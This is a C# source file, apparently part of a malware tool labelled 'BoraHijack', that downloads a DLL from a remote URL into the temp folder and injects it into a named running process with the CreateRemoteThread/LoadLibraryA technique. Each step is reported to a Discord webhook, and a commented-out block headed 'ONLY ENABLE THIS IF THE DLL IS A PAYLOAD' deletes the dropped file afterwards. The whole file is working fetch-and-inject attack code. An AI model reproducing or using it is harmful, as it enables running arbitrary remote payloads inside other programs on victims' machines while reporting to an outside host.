using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Net.Http;
using System.IO;
using System.Threading.Tasks;
using Discord;
using Discord.Webhook;

public class Inject
{
    public static class DllInjector
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;

        public static void InjectDll(int processId, string dllPath)
        {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr remoteMem = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;

            try
            {
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
                if (hProcess == IntPtr.Zero)
                {
                    // Log: Failed to open process. Error: " + Marshal.GetLastWin32Error()
                    return;
                }

                IntPtr kernel32 = GetModuleHandle("kernel32.dll");
                IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    // Log: Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error()
                    return;
                }

                byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
                remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (remoteMem == IntPtr.Zero)
                {
                    // Log: Failed to allocate memory in remote process. Error: " + Marshal.GetLastWin32Error()
                    return;
                }

                UIntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, remoteMem, dllPathBytes, (uint)dllPathBytes.Length, out bytesWritten))
                {
                    // Log: Failed to write DLL path to remote process memory. Error: " + Marshal.GetLastWin32Error()
                    return;
                }

                IntPtr threadId;
                hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, remoteMem, 0, out threadId);
                if (hThread == IntPtr.Zero)
                {
                    // Log: Failed to create remote thread. Error: " + Marshal.GetLastWin32Error()
                    return;
                }

                // Log: Successfully injected DLL '{dllPath}' into process ID {processId}.
            }
            catch (Exception)
            {
                // Log: An error occurred during injection: {ex.Message}
            }
            finally
            {
                if (hThread != IntPtr.Zero) CloseHandle(hThread);
                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
            }
        }
    }

    public static async Task DownInjectDll(string dllUrl, string targetProcessName, string webhookUrl)
    {
        HttpClient httpClient = new HttpClient();
        string tempDllPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".dll");
        var client = new DiscordWebhookClient(webhookUrl);

        try
        {
            await client.SendMessageAsync(
                text: "",
                username: "Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder()
                .WithTitle("Downloading DLL for injection")
                .WithDescription("Downloading DLL")
                .WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or")
                .WithColor(255, 230, 0)
                .Build() 
                });

            byte[] dllBytes = await httpClient.GetByteArrayAsync(dllUrl);
            await client.SendMessageAsync(
                text: "",
                username: "Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder()
                    .WithTitle("Complete")
                    .WithDescription("Complete Downloading Dll, now saving to **TEMP**")
                    .WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or")
                    .WithColor(255, 230, 0)
                    .Build()
                });

            // Log: Saving DLL to temporary path: {tempDllPath}
            File.WriteAllBytes(tempDllPath, dllBytes);
            await client.SendMessageAsync(
                text: "",
                username: "Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder()
                    .WithTitle("Successfully saved")
                    .WithDescription("Successfully saved in temporary directory")
                    .WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or")
                    .WithColor(255, 230, 0)
                    .Build()
                });

            Process[] processes = Process.GetProcessesByName(targetProcessName);
            if (processes.Length > 0)
            {
                int targetPid = processes[0].Id;
                // Log: Found target process '{targetProcessName}' with PID: {targetPid}
                await client.SendMessageAsync(
                    text: "",
                    username: "Lambda",
                    avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                    isTTS: false,
                    embeds: new[] { new EmbedBuilder()
                        .WithTitle("Target Process found!")
                        .WithDescription($"**Now injecting into {targetProcessName} (PID: {targetPid}**")
                        .WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or")
                        .WithColor(255, 230, 0)
                        .Build()
                    });

                DllInjector.InjectDll(targetPid, tempDllPath);
            }
            else
            {
                // Log: Target process '{targetProcessName}' not found.
                // Log: Please ensure the target application is running before attempting to inject.
                await client.SendMessageAsync(
                    text: "",
                    username: "Lambda",
                    avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                    isTTS: false,
                    embeds: new[] { new EmbedBuilder()
                        .WithTitle($"Failed Finding Process {targetProcessName}")
                        .WithDescription($"Failed finding {targetProcessName}")
                        .WithFooter("Injection/Firewall Service for BoraHijack • By v1s0or")
                        .WithColor(255, 230, 0)
                        .Build()
                    });

            }
        }
        catch (HttpRequestException exhttp)
        {
            // Log: Error downloading DLL: {ex.Message}
            // Log: Check the URL and your internet connection.

            await client.SendMessageAsync(
                text: "",
                username: "Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder()
                    .WithTitle("Error Downloading DLL")
                    .WithDescription("Error while downloading **DLL** in **HTTP**: " + exhttp.Message)
                    .WithColor(252, 2, 2)
                    .Build()
                });
        }
        catch (Exception norex)
        {
            // Log: An error occurred: {ex.Message}

            await client.SendMessageAsync(
                text: "",
                username: "Lambda",
                avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder()
                    .WithTitle("Injector Error")
                    .WithDescription($"Error: {norex.Message}")
                    .WithColor(252, 2, 2)
                    .Build()
                });
        }

        /*// ONLY ENABLE THIS IF THE DLL IS A PAYLOAD
        finally
        {
            if (File.Exists(tempDllPath))
            {
                try
                {
                    File.Delete(tempDllPath);
                    // Log: Temporary DLL file deleted: {tempDllPath}

                    await client.SendMessageAsync(
                        text: "",
                        username: "Lambda",
                        avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                        isTTS: false,
                        embeds: new[] { new EmbedBuilder()
                            .WithTitle("DLL deleted")
                            .WithDescription("DLL deleted!")
                            .WithColor(255, 230, 0)
                            .Build()
                        });
                }
                catch (IOException ioex)
                {
                    // Log: Could not delete temporary DLL file (it might be in use): {ioEx.Message}
                    await client.SendMessageAsync(
                        text: "",
                        username: "Lambda",
                        avatarUrl: "https://files.catbox.moe/k7o7wb.png",
                        isTTS: false,
                        embeds: new[] { new EmbedBuilder()
                            .WithTitle("Error while deleting dll")
                            .WithDescription("Error: " + ioex.Message)
                            .WithColor(252, 2, 2)
                            .Build()
                        });
                }
            }
        } finally ends here */
    }
}